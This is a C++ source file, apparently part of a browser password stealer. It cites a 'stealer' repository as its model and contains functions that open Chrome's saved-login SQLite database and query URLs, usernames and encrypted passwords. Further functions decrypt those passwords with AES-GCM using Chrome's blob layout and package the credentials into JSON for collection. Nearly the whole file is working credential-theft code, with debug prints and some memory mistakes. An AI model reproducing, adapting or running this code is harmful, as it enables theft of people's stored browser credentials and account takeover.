#include "SQLfunctions.h"

std::string hexStr(const uint8_t *data, int len)
//https://stackoverflow.com/questions/14050452/how-to-convert-byte-array-to-hex-string-in-visual-c
{
     std::stringstream ss;
     ss << std::hex << std::setfill ('0');

     for( int i(0) ; i < len; ++i )
         ss<<std::setw(2)<<static_cast<int>(data[i]);

     return ss.str();
}

BYTE * getPassword(BYTE * key, BYTE * encrypted_password, DWORD encryp_len){
    /* cries in c*/
    
    auto box = new AESGCM(key);
    box->ciphertext = encrypted_password + 15;
    box->ctBufferSize = encryp_len - 15 - 16;
    box->tag = encrypted_password + encryp_len - 16;
    box->Decrypt(encrypted_password + 3, 12, box->ciphertext,box->ctBufferSize, box->tag, box->authTagLengths.dwMaxLength );
    BYTE * ret = (BYTE *)malloc(box->ptBufferSize + 1);
    for(size_t i=0; i< box->ptBufferSize; i++){
        ret[i] = box->plaintext[i];
        printf("%c", (char) box->plaintext[i]);
    }
    printf("\n");
    delete box;
    printf("Goodbye!\n");
    return ret;
}

//inspired by https://github.com/HlebHatouka/stealer/blob/master/windows/tools.h
//for how to parse sql data!
std::stringstream get_chrome_pass(BYTE *key, sqlite3* db)
{
    std::string sql = "SELECT action_url, username_value, password_value FROM logins";

    std::stringstream dump(std::string(""));
    sqlite3_stmt *pStmt;
    int rc;
    rc = sqlite3_prepare(db, sql.c_str(), -1, &pStmt, 0);
    if (rc != SQLITE_OK)
    {
        dump << "statement failed rc = " << rc;
        return dump;
    }

    rc = sqlite3_step(pStmt);
    //std::cout << "RC: " << rc << std::endl;
    while (rc == SQLITE_ROW) 
    {
        printf("IN RC row\n");
        dump << sqlite3_column_text(pStmt, 0) << std::endl;
        dump << (char *)sqlite3_column_text(pStmt, 1) << std::endl;
        std::cout << dump.str();
        DATA_BLOB encryptedPass;
        DWORD *data = (DWORD *)malloc(sizeof(DWORD));
        encryptedPass.cbData = *data;
        encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
        encryptedPass.pbData = (BYTE *)malloc((int)encryptedPass.cbData);
        DATA_BLOB decryptedPass;
        //encryptedPass.pbData = (BYTE *)malloc((int)encryptedPass.cbData);
        memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);
        /* print encrypted password*/
        for (DWORD i = 0; i < encryptedPass.cbData; i++){
        printf("%x", encryptedPass.pbData[i]);
    }
    printf("\n");
        printf("ABOUT TO CALL GETPASSW\n");
        /* insert own encryption*/
        BYTE *password= getPassword( key , encryptedPass.pbData, encryptedPass.cbData);
        while (isprint(*password))
        {
            dump << *password;
            password++;
        }

        dump << std::endl;
        free(data);
        free(encryptedPass.pbData);
        rc = sqlite3_step(pStmt);
    }
    rc = sqlite3_finalize(pStmt);
    return dump;
}

json getAllResults(const char * temp){

   sqlite3 *db;
   int db_res;
    //https://www.tutorialspoint.com/sqlite/sqlite_c_cpp.htm
   db_res = sqlite3_open(temp, &db);

   if( db_res ) {
      fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
      return(0);
   } else {
      fprintf(stderr, "Opened database successfully\n");
   }
    std::vector<json> data;
    std::string sql = "SELECT origin_url, username_value, password_value FROM logins";

    std::stringstream dump(std::string(""));
    sqlite3_stmt *pStmt;
    int rc;
    rc = sqlite3_prepare(db, sql.c_str(), -1, &pStmt, 0);
    if (rc != SQLITE_OK)
    {
        dump << "statement failed rc = " << rc;
        return json("HEY YOU SUCK!");
    }

    rc = sqlite3_step(pStmt);
    //std::cout << "RC: " << rc << std::endl;
    while (rc == SQLITE_ROW) 
    {
        json temp;
        //printf("IN RC row\n");
        temp["url"] = (char*)sqlite3_column_text(pStmt, 0);
        //const char * a= sqlite3_column_blob(pStmt, 2);
        
        // hexStr();
        DATA_BLOB encryptedPass;
        DWORD *d = (DWORD *)malloc(sizeof(DWORD));
        encryptedPass.cbData = *d;
        encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
        encryptedPass.pbData = (BYTE *)malloc((int)encryptedPass.cbData);
        memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);
        temp["password"] = hexStr(encryptedPass.pbData, encryptedPass.cbData);
        
        //for (int i = 0 ; i < encryptedPass.cbData; i++){
          //  printf("%x", encryptedPass.pbData[i]);
        //} 
        temp["username"] = (char *) sqlite3_column_text(pStmt, 1);
        /*
        dump << sqlite3_column_text(pStmt, 0) << std::endl;
        dump << (char *)sqlite3_column_text(pStmt, 1) << std::endl;
        std::cout << dump.str();
        DATA_BLOB encryptedPass;
        DWORD *data = (DWORD *)malloc(sizeof(DWORD));
        encryptedPass.cbData = *data;
        encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
        encryptedPass.pbData = (BYTE *)malloc((int)encryptedPass.cbData);
        DATA_BLOB decryptedPass;
        //encryptedPass.pbData = (BYTE *)malloc((int)encryptedPass.cbData);
        memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);
         print encrypted password
        for (DWORD i = 0; i < encryptedPass.cbData; i++){
        printf("%x", encryptedPass.pbData[i]);
    }
    printf("\n");
        printf("ABOUT TO CALL GETPASSW\n");
        // insert own encryption
        BYTE *password= getPassword( key , encryptedPass.pbData, encryptedPass.cbData);
        while (isprint(*password))
        {
            dump << *password;
            password++;
        }
        */

        dump << std::endl;
        //free(data);
        //free(encryptedPass.pbData);
        rc = sqlite3_step(pStmt);
        data.push_back(temp);
    }
    rc = sqlite3_finalize(pStmt);
    sqlite3_close(db);
    return data;

}